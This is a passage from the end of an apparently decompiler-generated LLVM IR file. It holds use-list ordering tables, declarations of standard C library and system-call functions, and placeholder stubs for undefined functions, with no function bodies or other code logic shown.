274, 452, 453, 275, 376, 454, 276, 377, 149, 455, 771, 772, 150, 151, 277, 378, 108, 42, 43, 773, 774, 775, 776, 777, 778, 152, 153, 278, 379, 107, 779, 187, 780, 95, 781, 782, 784, 456, 783, 673, 457, 225, 674, 458, 675, 676, 677, 679, 680, 681, 682, 683, 684, 685, 686, 687, 585, 586, 26, 279, 226, 61, 154, 155, 11, 12, 227, 1047, 1049, 156, 630, 597, 7, 157, 841, 842, 280, 843, 158, 459, 844, 188, 845, 62, 678, 228, 229, 159, 846, 847, 848, 688, 689, 690, 691, 160, 728, 63, 460, 729, 461, 731, 730, 189, 462, 463, 732, 734, 733, 190, 464, 692, 735, 529, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 161, 465, 861, 230, 862, 863, 864, 865, 866, 27, 28, 466, 200, 201, 867, 868, 869, 870, 162, 871, 872, 873, 467, 874, 29, 30, 163, 468, 875, 876, 877, 880, 878, 879, 31, 44, 64, 881, 882, 883, 884, 255, 885, 886, 164, 887, 888, 889, 890, 891, 892, 893, 894, 166, 895, 896, 897, 469, 898, 899, 191, 192, 900, 901, 902, 167, 165, 903, 168, 904, 905, 470, 906, 907, 908, 909, 910, 911, 912, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 169, 471, 472, 170, 925, 926, 927, 473, 474, 928, 929, 930, 931, 932, 933, 934, 935, 475, 476, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 477, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 231, 478, 232, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 233, 977, 978, 979, 980, 981, 982, 983, 32, 65, 66, 67, 68, 984, 985, 986, 987, 988, 989, 171, 990, 479, 991, 992, 993, 994, 380, 995, 996, 997, 998, 999, 1000, 172, 480, 96, 40, 88, 913, 193, 1034, 1035, 194, 1037, 1036, 69, 281, 481, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 234, 746, 173, 482, 483, 747, 175, 176, 174, 381, 177, 382, 530, 195, 531, 532, 235, 236, 533, 383, 534, 202, 384, 535, 178, 536, 537, 538, 1001, 179, 748, 484, 750, 1016, 577, 713, 1006, 1048, 1007, 785, 749, 512, 385, 282, 283, 284, 285, 286, 287, 513, 514, 70, 386, 515, 516, 517, 518, 519, 520, 521, 522, 288, 523, 199, 74, 73, 8, 237, 524, 525, 198, 72, 71, 9, 238, 289, 203, 243, 559, 560, 561, 562, 395, 563, 204, 205, 290, 387, 388, 244, 564, 245, 75, 565, 566, 567, 568, 569, 389, 206, 207, 291, 390, 391, 246, 247, 578, 579, 580, 581, 582, 583, 392, 292, 584, 33, 45, 76, 587, 34, 35, 239, 588, 293, 240, 241, 295, 693, 80, 694, 695, 696, 248, 79, 697, 397, 301, 302, 78, 698, 699, 700, 249, 77, 296, 701, 297, 702, 294, 398, 303, 304, 298, 299, 300, 703, 704, 705, 396, 399, 706, 707, 708, 709, 81, 82, 83, 84, 710, 711, 180, 306, 307, 250, 714, 308, 715, 251, 305, 252, 309, 716, 717, 310, 311, 751, 752, 36, 85, 86, 19, 46, 753, 37, 786, 1052, 1053, 256, 1054, 1055, 10, 1002, 1003, 1004, 181, 485, 196, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063 }
  uselistorder i32* @ebx, { 35, 226, 227, 354, 355, 119, 121, 124, 125, 126, 127, 128, 122, 120, 123, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 150, 1, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 163, 161, 162, 48, 49, 356, 357, 358, 228, 2, 229, 230, 231, 3, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 359, 360, 361, 362, 164, 165, 302, 303, 448, 449, 5, 179, 168, 166, 167, 169, 174, 170, 171, 175, 176, 177, 4, 178, 180, 181, 182, 183, 184, 185, 186, 6, 187, 7, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 50, 51, 52, 53, 54, 55, 56, 57, 243, 244, 245, 246, 8, 247, 9, 248, 249, 363, 364, 365, 366, 10, 367, 368, 369, 11, 370, 12, 371, 372, 373, 374, 375, 454, 455, 13, 456, 457, 460, 461, 76, 77, 78, 79, 376, 80, 81, 462, 463, 304, 14, 305, 306, 82, 83, 464, 465, 96, 307, 466, 59, 467, 468, 469, 470, 471, 472, 84, 85, 58, 473, 474, 475, 476, 477, 222, 223, 308, 309, 478, 479, 480, 33, 34, 493, 494, 495, 502, 503, 504, 505, 30, 15, 28, 496, 499, 500, 501, 481, 97, 98, 99, 100, 101, 102, 103, 104, 482, 483, 484, 485, 492, 113, 114, 60, 61, 62, 63, 64, 105, 106, 16, 0, 107, 297, 298, 66, 108, 109, 110, 65, 67, 299, 300, 301, 497, 498, 68, 69, 70, 71, 310, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 17, 325, 326, 311, 312, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 31, 338, 339, 340, 341, 342, 18, 343, 344, 345, 346, 347, 348, 349, 350, 351, 202, 203, 204, 205, 206, 207, 19, 208, 209, 210, 506, 507, 508, 509, 510, 511, 512, 515, 516, 172, 173, 377, 378, 379, 380, 381, 382, 383, 384, 385, 211, 212, 213, 214, 20, 21, 215, 216, 217, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 218, 219, 220, 221, 266, 267, 268, 269, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 420, 421, 22, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 23, 435, 436, 437, 438, 439, 440, 72, 73, 74, 75, 415, 417, 416, 418, 419, 486, 24, 487, 488, 489, 490, 32, 25, 29, 491, 517, 518, 519, 520, 521, 270, 271, 272, 273, 274, 275, 276, 26, 277, 27, 278, 279, 280, 281, 282, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 441, 442, 443, 283, 284, 287, 288, 289, 458, 459, 115, 116, 224, 225, 450, 451, 513, 514, 452, 453, 352, 353, 285, 286, 111, 112, 117, 118, 290, 291, 292, 293, 294, 295, 296, 522, 523, 524, 525, 444, 445, 446, 447 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i8 @__decompiler_undefined_function_5() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_6() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_7() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_8() local_unnamed_addr

declare %rusage* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
